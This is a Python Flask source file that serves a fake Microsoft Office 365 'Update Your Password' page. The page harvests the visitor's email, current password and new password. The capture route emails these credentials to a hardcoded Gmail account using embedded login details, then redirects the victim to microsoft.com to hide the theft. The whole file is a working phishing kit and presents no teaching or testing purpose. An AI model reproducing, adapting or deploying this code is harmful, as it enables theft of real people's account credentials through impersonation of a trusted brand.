from flask import Flask, request, redirect, url_for
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

@app.route('/')
def home():
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Microsoft Office 365 - Password Update</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    color: #333;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    max-width: 400px;
                    width: 100%;
                    text-align: center;
                }
                h1 {
                    font-size: 24px;
                    color: #0078d4;
                    text-align: center;
                    margin-bottom: 20px;
                }
                img {
                    width: 100px;
                    margin-bottom: 20px;
                }
                input[type="email"],
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                }
                button {
                    width: 100%;
                    padding: 10px;
                    background-color: #0078d4;
                    color: #fff;
                    border: none;
                    border-radius: 4px;
                    font-size: 16px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #005a9e;
                }
                p {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
                <h1>Update Your Password</h1>
                <form action="http://localhost:5000/capture" method="post">
                    <input type="email" name="email" placeholder="Enter your email" required>
                    <input type="password" name="old_password" placeholder="Enter your current password" required>
                    <input type="password" name="new_password" placeholder="Enter your new password" required>
                    <input type="password" name="confirm_password" placeholder="Confirm your new password" required>
                    <button type="submit">Update Password</button>
                </form>
                <p>Your password must be updated to comply with our latest security standards.</p>
            </div>
        </body>
        </html>

    '''

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form['email']
    old_password = request.form['old_password']
    new_password = request.form['new_password']
    confirm_password = request.form['confirm_password']

    # Create the email content
    email_content = f"""
    Email: {email}\n
    Old Password: {old_password}\n
    New Password: {new_password}\n
    Confirm New Password: {confirm_password}\n
    """

    # Send the email
    send_email(email_content)
    
    return redirect("https://www.microsoft.com")  # Redirect to a safe URL

def send_email(content):
    sender_email = "muhammadalimanzer@gmail.com"
    receiver_email = "muhammadalimanzer@gmail.com"
    password = "otmm iykl ejxj infn"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Captured Password Update Data"

    msg.attach(MIMEText(content, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(msg)
        print('Email sent successfully')
    except Exception as e:
        print(f'Error sending email: {e}')

if __name__ == '__main__':
    app.run(port=5000, debug=True)
